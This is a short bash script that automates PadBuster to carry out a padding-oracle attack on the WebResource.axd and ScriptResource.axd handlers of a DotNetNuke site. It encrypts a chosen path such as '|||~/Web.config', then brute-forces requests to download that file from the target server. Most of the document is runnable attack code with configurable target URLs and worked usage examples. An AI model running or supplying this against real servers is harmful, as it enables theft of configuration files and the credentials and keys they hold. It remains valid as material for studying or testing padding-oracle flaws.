#!/bin/bash
# Automatic PadBuster runner.
#
# Usage:
#   - modify variables at the beginning of this script
#   - run:
#   ./runfile.sh <resource_path> <save_to_file>
#   ./runfile.sh '|||~/Web.config' 'Web.config'
#
# This script uses PadBuster to first encode the given <resource_path> parameter
# and than using it in the second automated file retrieval mode.
#
# For example it runs PadBuster (encoding phase) with parameters like:
#   ./padBuster.pl 'http://example.com/dotnetnuke/WebResource.axd?d=cUWPUb60YjfipBsfszacsQ2' 'cUWPUb60YjfipBsfszacsQ2' 8 \
#       -encoding 3 -prefix 'cUWPUb60YjfipBsfszacsQ2' -log \
#       -auto 100000 \
#       -runafter "./padBuster.pl 'http://example.com/dotnetnuke/ScriptResource.axd?d=#ENC' '#ENC' 8 -encoding 3 -bruteforce -randomize -log '#DIR' -ignoredistance 55 -auto 100000 -autostore 'files/Web.config.#STAT-#SUM'" \
#       -plaintext '|||~/Web.config'
#
# After encoding the <resource_path> it starts the automatic bruteforcing and
# downloading phase (or whatever is given for the -runafter parameter). Eg:
#   ./padBuster.pl 'http://example.com/dotnetnuke/ScriptResource.axd?d=ZXzZXHDtAJS0xXgU2mjYjwAAAAAAAAAA0' 'ZXzZXHDtAJS0xXgU2mjYjwAAAAAAAAAA0' 8 \
#       -encoding 3 -bruteforce -randomize -log 'PadBuster.28SEP11-55659' \
#       -ignoredistance 55 -auto 100000 -autostore 'files/Web.config.#STAT-#SUM'
#
# PadBuster will try to ignore all useless responses by comparing their
# difference and storing everything interesting in the directory 'files'.
#
# Author: GW <gw.2011@tnode.com or http://gw.tnode.com/>

# Modify these variables:
PREFIX='cUWPUb60YjfipBsfszacsQ2'
CRYPTURL="http://example.com/dotnetnuke/WebResource.axd?d=$PREFIX"
DOWNLOADURL="http://example.com/dotnetnuke/ScriptResource.axd?d=#ENC";
BLOCKSIZE=8

echo "--- '$1'"

SUBCMD="./padBuster.pl '$DOWNLOADURL' '#ENC' $BLOCKSIZE -encoding 3 -bruteforce -randomize -log '#DIR' -ignoredistance 55"
if [ "$2" != '' ]; then
	SUBCMD="$SUBCMD -auto 100000 -autostore 'files/$2.#STAT-#SUM'";
fi
./padBuster.pl "$CRYPTURL" "$PREFIX" $BLOCKSIZE -encoding 3 -prefix "$PREFIX" -log -auto 100000 -runafter "$SUBCMD" -plaintext "$1"

